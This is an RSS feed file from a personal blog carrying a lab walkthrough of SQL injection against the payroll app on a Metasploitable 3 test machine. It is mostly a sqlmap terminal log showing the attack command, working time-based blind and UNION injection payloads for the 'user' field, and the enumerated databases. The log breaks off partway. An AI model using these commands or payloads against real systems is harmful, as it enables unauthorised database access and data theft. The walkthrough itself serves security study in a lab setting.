@@ -1,0 +1,462 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Sqlmap on Abril Jordan Casinillo</title><link>https://abriljordan.github.io/ajcasinillo/tags/sqlmap/</link><description>Recent content in Sqlmap on Abril Jordan Casinillo</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Fri, 18 Aug 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://abriljordan.github.io/ajcasinillo/tags/sqlmap/index.xml" rel="self" type="application/rss+xml"/><item><title>SQL Injection on Payroll Web Application</title><link>https://abriljordan.github.io/ajcasinillo/p/sql-injection-on-payroll-web-application/</link><pubDate>Fri, 18 Aug 2023 00:00:00 +0000</pubDate><guid>https://abriljordan.github.io/ajcasinillo/p/sql-injection-on-payroll-web-application/</guid><description>&lt;h2 id="target-metasploitable-3-linux">Target: Metasploitable 3 Linux
+&lt;/h2>&lt;h2 id="tool-sqlmap">Tool: SQLmap
+&lt;/h2>&lt;h2 id="vulnerability-sql-injection">Vulnerability: SQL Injection
+&lt;/h2>&lt;p>SQL Injection on Payroll Web Application using SQLmap&lt;/p>
+&lt;p>An open-source program called SQLmap is used in penetration tests to find and take advantage of injection vulnerabilities. Because SQLmap automates the process of identifying and taking advantage of SQL injection, it is especially helpful in saving time.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt"> 10
+&lt;/span>&lt;span class="lnt"> 11
+&lt;/span>&lt;span class="lnt"> 12
+&lt;/span>&lt;span class="lnt"> 13
+&lt;/span>&lt;span class="lnt"> 14
+&lt;/span>&lt;span class="lnt"> 15
+&lt;/span>&lt;span class="lnt"> 16
+&lt;/span>&lt;span class="lnt"> 17
+&lt;/span>&lt;span class="lnt"> 18
+&lt;/span>&lt;span class="lnt"> 19
+&lt;/span>&lt;span class="lnt"> 20
+&lt;/span>&lt;span class="lnt"> 21
+&lt;/span>&lt;span class="lnt"> 22
+&lt;/span>&lt;span class="lnt"> 23
+&lt;/span>&lt;span class="lnt"> 24
+&lt;/span>&lt;span class="lnt"> 25
+&lt;/span>&lt;span class="lnt"> 26
+&lt;/span>&lt;span class="lnt"> 27
+&lt;/span>&lt;span class="lnt"> 28
+&lt;/span>&lt;span class="lnt"> 29
+&lt;/span>&lt;span class="lnt"> 30
+&lt;/span>&lt;span class="lnt"> 31
+&lt;/span>&lt;span class="lnt"> 32
+&lt;/span>&lt;span class="lnt"> 33
+&lt;/span>&lt;span class="lnt"> 34
+&lt;/span>&lt;span class="lnt"> 35
+&lt;/span>&lt;span class="lnt"> 36
+&lt;/span>&lt;span class="lnt"> 37
+&lt;/span>&lt;span class="lnt"> 38
+&lt;/span>&lt;span class="lnt"> 39
+&lt;/span>&lt;span class="lnt"> 40
+&lt;/span>&lt;span class="lnt"> 41
+&lt;/span>&lt;span class="lnt"> 42
+&lt;/span>&lt;span class="lnt"> 43
+&lt;/span>&lt;span class="lnt"> 44
+&lt;/span>&lt;span class="lnt"> 45
+&lt;/span>&lt;span class="lnt"> 46
+&lt;/span>&lt;span class="lnt"> 47
+&lt;/span>&lt;span class="lnt"> 48
+&lt;/span>&lt;span class="lnt"> 49
+&lt;/span>&lt;span class="lnt"> 50
+&lt;/span>&lt;span class="lnt"> 51
+&lt;/span>&lt;span class="lnt"> 52
+&lt;/span>&lt;span class="lnt"> 53
+&lt;/span>&lt;span class="lnt"> 54
+&lt;/span>&lt;span class="lnt"> 55
+&lt;/span>&lt;span class="lnt"> 56
+&lt;/span>&lt;span class="lnt"> 57
+&lt;/span>&lt;span class="lnt"> 58
+&lt;/span>&lt;span class="lnt"> 59
+&lt;/span>&lt;span class="lnt"> 60
+&lt;/span>&lt;span class="lnt"> 61
+&lt;/span>&lt;span class="lnt"> 62
+&lt;/span>&lt;span class="lnt"> 63
+&lt;/span>&lt;span class="lnt"> 64
+&lt;/span>&lt;span class="lnt"> 65
+&lt;/span>&lt;span class="lnt"> 66
+&lt;/span>&lt;span class="lnt"> 67
+&lt;/span>&lt;span class="lnt"> 68
+&lt;/span>&lt;span class="lnt"> 69
+&lt;/span>&lt;span class="lnt"> 70
+&lt;/span>&lt;span class="lnt"> 71
+&lt;/span>&lt;span class="lnt"> 72
+&lt;/span>&lt;span class="lnt"> 73
+&lt;/span>&lt;span class="lnt"> 74
+&lt;/span>&lt;span class="lnt"> 75
+&lt;/span>&lt;span class="lnt"> 76
+&lt;/span>&lt;span class="lnt"> 77
+&lt;/span>&lt;span class="lnt"> 78
+&lt;/span>&lt;span class="lnt"> 79
+&lt;/span>&lt;span class="lnt"> 80
+&lt;/span>&lt;span class="lnt"> 81
+&lt;/span>&lt;span class="lnt"> 82
+&lt;/span>&lt;span class="lnt"> 83
+&lt;/span>&lt;span class="lnt"> 84
+&lt;/span>&lt;span class="lnt"> 85
+&lt;/span>&lt;span class="lnt"> 86
+&lt;/span>&lt;span class="lnt"> 87
+&lt;/span>&lt;span class="lnt"> 88
+&lt;/span>&lt;span class="lnt"> 89
+&lt;/span>&lt;span class="lnt"> 90
+&lt;/span>&lt;span class="lnt"> 91
+&lt;/span>&lt;span class="lnt"> 92
+&lt;/span>&lt;span class="lnt"> 93
+&lt;/span>&lt;span class="lnt"> 94
+&lt;/span>&lt;span class="lnt"> 95
+&lt;/span>&lt;span class="lnt"> 96
+&lt;/span>&lt;span class="lnt"> 97
+&lt;/span>&lt;span class="lnt"> 98
+&lt;/span>&lt;span class="lnt"> 99
+&lt;/span>&lt;span class="lnt">100
+&lt;/span>&lt;span class="lnt">101
+&lt;/span>&lt;span class="lnt">102
+&lt;/span>&lt;span class="lnt">103
+&lt;/span>&lt;span class="lnt">104
+&lt;/span>&lt;span class="lnt">105
+&lt;/span>&lt;span class="lnt">106
+&lt;/span>&lt;span class="lnt">107
+&lt;/span>&lt;span class="lnt">108
+&lt;/span>&lt;span class="lnt">109
+&lt;/span>&lt;span class="lnt">110
+&lt;/span>&lt;span class="lnt">111
+&lt;/span>&lt;span class="lnt">112
+&lt;/span>&lt;span class="lnt">113
+&lt;/span>&lt;span class="lnt">114
+&lt;/span>&lt;span class="lnt">115
+&lt;/span>&lt;span class="lnt">116
+&lt;/span>&lt;span class="lnt">117
+&lt;/span>&lt;span class="lnt">118
+&lt;/span>&lt;span class="lnt">119
+&lt;/span>&lt;span class="lnt">120
+&lt;/span>&lt;span class="lnt">121
+&lt;/span>&lt;span class="lnt">122
+&lt;/span>&lt;span class="lnt">123
+&lt;/span>&lt;span class="lnt">124
+&lt;/span>&lt;span class="lnt">125
+&lt;/span>&lt;span class="lnt">126
+&lt;/span>&lt;span class="lnt">127
+&lt;/span>&lt;span class="lnt">128
+&lt;/span>&lt;span class="lnt">129
+&lt;/span>&lt;span class="lnt">130
+&lt;/span>&lt;span class="lnt">131
+&lt;/span>&lt;span class="lnt">132
+&lt;/span>&lt;span class="lnt">133
+&lt;/span>&lt;span class="lnt">134
+&lt;/span>&lt;span class="lnt">135
+&lt;/span>&lt;span class="lnt">136
+&lt;/span>&lt;span class="lnt">137
+&lt;/span>&lt;span class="lnt">138
+&lt;/span>&lt;span class="lnt">139
+&lt;/span>&lt;span class="lnt">140
+&lt;/span>&lt;span class="lnt">141
+&lt;/span>&lt;span class="lnt">142
+&lt;/span>&lt;span class="lnt">143
+&lt;/span>&lt;span class="lnt">144
+&lt;/span>&lt;span class="lnt">145
+&lt;/span>&lt;span class="lnt">146
+&lt;/span>&lt;span class="lnt">147
+&lt;/span>&lt;span class="lnt">148
+&lt;/span>&lt;span class="lnt">149
+&lt;/span>&lt;span class="lnt">150
+&lt;/span>&lt;span class="lnt">151
+&lt;/span>&lt;span class="lnt">152
+&lt;/span>&lt;span class="lnt">153
+&lt;/span>&lt;span class="lnt">154
+&lt;/span>&lt;span class="lnt">155
+&lt;/span>&lt;span class="lnt">156
+&lt;/span>&lt;span class="lnt">157
+&lt;/span>&lt;span class="lnt">158
+&lt;/span>&lt;span class="lnt">159
+&lt;/span>&lt;span class="lnt">160
+&lt;/span>&lt;span class="lnt">161
+&lt;/span>&lt;span class="lnt">162
+&lt;/span>&lt;span class="lnt">163
+&lt;/span>&lt;span class="lnt">164
+&lt;/span>&lt;span class="lnt">165
+&lt;/span>&lt;span class="lnt">166
+&lt;/span>&lt;span class="lnt">167
+&lt;/span>&lt;span class="lnt">168
+&lt;/span>&lt;span class="lnt">169
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-shell" data-lang="shell">&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌─&lt;span class="o">[&lt;/span>parrot@parrot&lt;span class="o">]&lt;/span>─&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└──╼ &lt;span class="nv">$sqlmap&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ___
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> __H__
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ___ ___&lt;span class="o">[&lt;/span>.&lt;span class="o">]&lt;/span>_____ ___ ___ &lt;span class="o">{&lt;/span>1.7.2#stable&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ -&lt;span class="p">|&lt;/span> . &lt;span class="o">[&lt;/span>&lt;span class="s1">&amp;#39;] | .&amp;#39;&lt;/span>&lt;span class="p">|&lt;/span> . &lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>___&lt;span class="p">|&lt;/span>_ &lt;span class="o">[(]&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>__,&lt;span class="p">|&lt;/span> _&lt;span class="p">|&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span>V... &lt;span class="p">|&lt;/span>_&lt;span class="p">|&lt;/span> https://sqlmap.org
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Usage: python3 sqlmap &lt;span class="o">[&lt;/span>options&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap: error: missing a mandatory option &lt;span class="o">(&lt;/span>-d, -u, -l, -m, -r, -g, -c, --wizard, --shell, --update, --purge, --list-tampers or --dependencies&lt;span class="o">)&lt;/span>. Use -h &lt;span class="k">for&lt;/span> basic and -hh &lt;span class="k">for&lt;/span> advanced &lt;span class="nb">help&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:48:05&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>WARNING&lt;span class="o">]&lt;/span> your sqlmap version is outdated
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">┌─&lt;span class="o">[&lt;/span>✗&lt;span class="o">]&lt;/span>─&lt;span class="o">[&lt;/span>parrot@parrot&lt;span class="o">]&lt;/span>─&lt;span class="o">[&lt;/span>~&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">└──╼ &lt;span class="nv">$sqlmap&lt;/span> -u http://10.0.2.28/payroll_app.php --forms --dbs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ___
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> __H__
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ___ ___&lt;span class="o">[(]&lt;/span>_____ ___ ___ &lt;span class="o">{&lt;/span>1.7.2#stable&lt;span class="o">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">|&lt;/span>_ -&lt;span class="p">|&lt;/span> . &lt;span class="o">[&lt;/span>,&lt;span class="o">]&lt;/span> &lt;span class="p">|&lt;/span> .&lt;span class="s1">&amp;#39;| . |
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">|___|_ [.]_|_|_|__,| _|
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1"> |_|V... |_| https://sqlmap.org
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&amp;#39;&lt;/span>s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible &lt;span class="k">for&lt;/span> any misuse or damage caused by this program
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> starting @ 12:50:06 /2024-03-03/
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:06&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing connection to the target URL
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:06&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> searching &lt;span class="k">for&lt;/span> forms
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>1/1&lt;span class="o">]&lt;/span> Form:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">POST http://10.0.2.28/payroll_app.php
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">POST data: &lt;span class="nv">user&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="nv">password&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="nv">s&lt;/span>&lt;span class="o">=&lt;/span>OK
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">do&lt;/span> you want to &lt;span class="nb">test&lt;/span> this form? &lt;span class="o">[&lt;/span>Y/n/q&lt;span class="o">]&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&amp;gt; Y
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">do&lt;/span> you want to fill blank fields with random values? &lt;span class="o">[&lt;/span>Y/n&lt;span class="o">]&lt;/span> Y
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:50&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> using &lt;span class="s1">&amp;#39;/home/parrot/.local/share/sqlmap/output/results-03032024_1250pm.csv&amp;#39;&lt;/span> as the CSV results file in multiple targets mode
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:50&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> checking &lt;span class="k">if&lt;/span> the target is protected by some kind of WAF/IPS
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:50&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="k">if&lt;/span> the target URL content is stable
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:51&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> target URL content is stable
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:51&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="k">if&lt;/span> POST parameter &lt;span class="s1">&amp;#39;user&amp;#39;&lt;/span> is dynamic
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:51&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>WARNING&lt;span class="o">]&lt;/span> POST parameter &lt;span class="s1">&amp;#39;user&amp;#39;&lt;/span> does not appear to be dynamic
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:51&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>WARNING&lt;span class="o">]&lt;/span> heuristic &lt;span class="o">(&lt;/span>basic&lt;span class="o">)&lt;/span> &lt;span class="nb">test&lt;/span> shows that POST parameter &lt;span class="s1">&amp;#39;user&amp;#39;&lt;/span> might not be injectable
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:51&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="k">for&lt;/span> SQL injection on POST parameter &lt;span class="s1">&amp;#39;user&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:51&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="s1">&amp;#39;AND boolean-based blind - WHERE or HAVING clause&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:51&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>WARNING&lt;span class="o">]&lt;/span> reflective value&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> found and filtering out
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:51&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="s1">&amp;#39;Boolean-based blind - Parameter replace (original value)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:51&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="s1">&amp;#39;MySQL &amp;gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:52&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="s1">&amp;#39;PostgreSQL AND error-based - WHERE or HAVING clause&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:52&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="s1">&amp;#39;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:52&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="s1">&amp;#39;Oracle AND error-based - WHERE or HAVING clause (XMLType)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:52&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="s1">&amp;#39;Generic inline queries&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:52&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="s1">&amp;#39;PostgreSQL &amp;gt; 8.1 stacked queries (comment)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:52&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="s1">&amp;#39;Microsoft SQL Server/Sybase stacked queries (comment)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:53&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="s1">&amp;#39;Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:50:53&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="s1">&amp;#39;MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:51:03&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> POST parameter &lt;span class="s1">&amp;#39;user&amp;#39;&lt;/span> appears to be &lt;span class="s1">&amp;#39;MySQL &amp;gt;= 5.0.12 AND time-based blind (query SLEEP)&amp;#39;&lt;/span> injectable
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">it looks like the back-end DBMS is &lt;span class="s1">&amp;#39;MySQL&amp;#39;&lt;/span>. Do you want to skip &lt;span class="nb">test&lt;/span> payloads specific &lt;span class="k">for&lt;/span> other DBMSes? &lt;span class="o">[&lt;/span>Y/n&lt;span class="o">]&lt;/span> Y
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">for&lt;/span> the remaining tests, &lt;span class="k">do&lt;/span> you want to include all tests &lt;span class="k">for&lt;/span> &lt;span class="s1">&amp;#39;MySQL&amp;#39;&lt;/span> extending provided level &lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span> and risk &lt;span class="o">(&lt;/span>1&lt;span class="o">)&lt;/span> values? &lt;span class="o">[&lt;/span>Y/n&lt;span class="o">]&lt;/span> Y
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:51:23&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> testing &lt;span class="s1">&amp;#39;Generic UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:51:23&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> automatically extending ranges &lt;span class="k">for&lt;/span> UNION query injection technique tests as there is at least one other &lt;span class="o">(&lt;/span>potential&lt;span class="o">)&lt;/span> technique found
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:51:23&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> &lt;span class="s1">&amp;#39;ORDER BY&amp;#39;&lt;/span> technique appears to be usable. This should reduce the &lt;span class="nb">time&lt;/span> needed to find the right number of query columns. Automatically extending the range &lt;span class="k">for&lt;/span> current UNION query injection technique &lt;span class="nb">test&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:51:23&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> target URL appears to have &lt;span class="m">4&lt;/span> columns in query
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>12:51:23&lt;span class="o">]&lt;/span> &lt;span class="o">[&lt;/span>INFO&lt;span class="o">]&lt;/span> POST parameter &lt;span class="s1">&amp;#39;user&amp;#39;&lt;/span> is &lt;span class="s1">&amp;#39;Generic UNION query (NULL) - 1 to 20 columns&amp;#39;&lt;/span> injectable
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">sqlmap identified the following injection point&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> with a total of &lt;span class="m">58&lt;/span> HTTP&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> requests:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">---
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Parameter: user &lt;span class="o">(&lt;/span>POST&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Type: time-based blind
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Title: MySQL &amp;gt;&lt;span class="o">=&lt;/span> 5.0.12 AND time-based blind &lt;span class="o">(&lt;/span>query SLEEP&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Payload: &lt;span class="nv">user&lt;/span>&lt;span class="o">=&lt;/span>CGYY&lt;span class="s1">&amp;#39; AND (SELECT 9858 FROM (SELECT(SLEEP(5)))lNho) AND &amp;#39;&lt;/span>xRHP&lt;span class="s1">&amp;#39;=&amp;#39;&lt;/span>xRHP&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="nv">password&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="p">&amp;amp;&lt;/span>&lt;span class="nv">s&lt;/span>&lt;span class="o">=&lt;/span>OK
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Type: UNION query
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Title: Generic UNION query &lt;span class="o">(&lt;/span>NULL&lt;span class="o">)&lt;/span> - &lt;span class="m">4&lt;/span> columns
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Payload: &lt;span class="nv">user&lt;/span>&lt;span class="o">=&lt;/span>CGYY&lt;span class="s1">&amp;#39; UNION ALL SELECT CONCAT(0x717a707a71,0x6f5763664f6a6a4e714e636a4c52676d6f584a5a4f7371786c46504a4b69744c4d4975564474554b,0x71766a7071),NULL,NULL,NULL-- -&amp;amp;password=&amp;amp;s=OK
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">---
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">do you want to exploit this SQL injection? [Y/n] Y
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[12:51:54] [INFO] the back-end DBMS is MySQL
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">web server operating system: Linux Ubuntu
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">web application technology: Apache 2.4.7, PHP 5.4.5
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">back-end DBMS: MySQL &amp;gt;= 5.0.12
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[12:51:54] [INFO] fetching database names
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">available databases [5]:
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[*] drupal
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[*] information_schema
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[*] mysql
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[*] payroll
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">[*] performance_schema
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s1">
